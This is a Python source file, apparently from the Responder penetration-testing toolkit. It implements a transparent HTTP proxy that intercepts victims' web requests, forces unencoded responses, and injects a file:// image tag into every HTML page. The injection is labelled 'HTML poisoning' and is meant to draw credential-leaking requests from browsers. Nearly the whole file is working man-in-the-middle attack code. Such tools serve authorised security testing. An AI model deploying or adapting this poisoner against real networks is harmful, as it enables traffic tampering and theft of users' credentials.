#!/usr/bin/env python
#
# This file is part of the Responder project which was originally written
# by Laurent Gaffie - Trustwave Holdings, the code in this file is based upon
# a Transparent HTTP proxy written by Erik Johansson and can be found at:
# https://github.com/erijo/transparent-proxy
#
# This poisoner has been converted for purpose, brought together with other
# peoples code and generally faffed around with by Felix Ryan.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

TESTING = True
VERBOSE = True

from twisted.web import http
from twisted.internet import reactor, protocol
from utils import color

class ProxyClient(http.HTTPClient):
    """ The proxy client connects to the real server, fetches the resource and
    sends it back to the original client, possibly in a slightly different
    form.
    """

    def __init__(self, method, uri, postData, headers, originalRequest):
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest
        self.contentLength = None

    def sendRequest(self):
        if VERBOSE:
            print color("[-] ", 1, 1) + "Sending request: %s %s" % (self.method, self.uri)
        self.sendCommand(self.method, self.uri)

    def sendHeaders(self):
        for key, values in self.headers:
            if key.lower() == 'connection':
                values = ['close']
            elif key.lower() == 'keep-alive':
                next

            if key.lower() == 'accept-encoding':
                values = ['none']

            for value in values:
                self.sendHeader(key, value)
        self.endHeaders()

    def sendPostData(self):
        if VERBOSE:
            print color("[-] ", 1, 1) + "Sending POST data"
        self.transport.write(self.postData)

    def connectionMade(self):
        if VERBOSE:
            print color("[-] ", 1, 1) + "HTTP connection made"
        self.sendRequest()
        self.sendHeaders()
        if self.method == 'POST':
            self.sendPostData()

    def handleStatus(self, version, code, message):
        if VERBOSE:
            print color("[-] ", 1, 1) + "Got server response: %s %s %s" % (version, code, message)
        self.originalRequest.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        if key.lower() == 'content-length':
            self.contentLength = value
        else:
            self.originalRequest.responseHeaders.addRawHeader(key, value)

    def handleResponse(self, data):
        data = self.originalRequest.processResponse(data)
        data = data.replace('</body>', '<img src="file://htmlinject/random.jpg" alt="" /></body>')
        if VERBOSE:
            print color("[+] ", 1, 1) + "HTML poisoning performed"
        if TESTING:
            self.writeRawData(data, "testfile.bin")
        if self.contentLength != None:
            self.originalRequest.setHeader('Content-Length', len(data))

        self.originalRequest.write(data)

        self.originalRequest.finish()
        self.transport.loseConnection()

    def writeRawData(self, data, filename):
        if TESTING:
            print color("[-] ", 1, 1) + "Attempting to write raw data to disk (" + filename + ") for testing purposes"
        outputFile = open(filename, "ab")
        outputFile.write(data)
        outputFile.close()


class ProxyClientFactory(protocol.ClientFactory):
    def __init__(self, method, uri, postData, headers, originalRequest):
        self.protocol = ProxyClient
        self.method = method
        self.uri = uri
        self.postData = postData
        self.headers = headers
        self.originalRequest = originalRequest

    def buildProtocol(self, addr):
        return self.protocol(self.method, self.uri, self.postData,
                             self.headers, self.originalRequest)

    def clientConnectionFailed(self, connector, reason):
        if VERBOSE:
            print color("[-] ", 1, 1) + "Server connection failed: %s" % reason
        self.originalRequest.setResponseCode(504)
        self.originalRequest.finish()


class ProxyRequest(http.Request):
    def __init__(self, channel, queued, reactor=reactor):
        http.Request.__init__(self, channel, queued)
        self.reactor = reactor

    def process(self):
        host = self.getHeader('host')
        if not host:
            self.setResponseCode(400)
            self.finish()
            if VERBOSE:
                print color("[-] ", 1, 1) + "No host header given"
            return

        port = 80
        if ':' in host:
            host, port = host.split(':')
            port = int(port)

        self.setHost(host, port)

        self.content.seek(0, 0)
        postData = self.content.read()
        factory = ProxyClientFactory(self.method, self.uri, postData,
                                     self.requestHeaders.getAllRawHeaders(),
                                     self)
        self.reactor.connectTCP(host, port, factory)

    def processResponse(self, data):
        return data


class TransparentProxy(http.HTTPChannel):
    requestFactory = ProxyRequest


class ProxyFactory(http.HTTPFactory):
    protocol = TransparentProxy


def main():
    reactor.listenTCP(3128, ProxyFactory())
    reactor.run()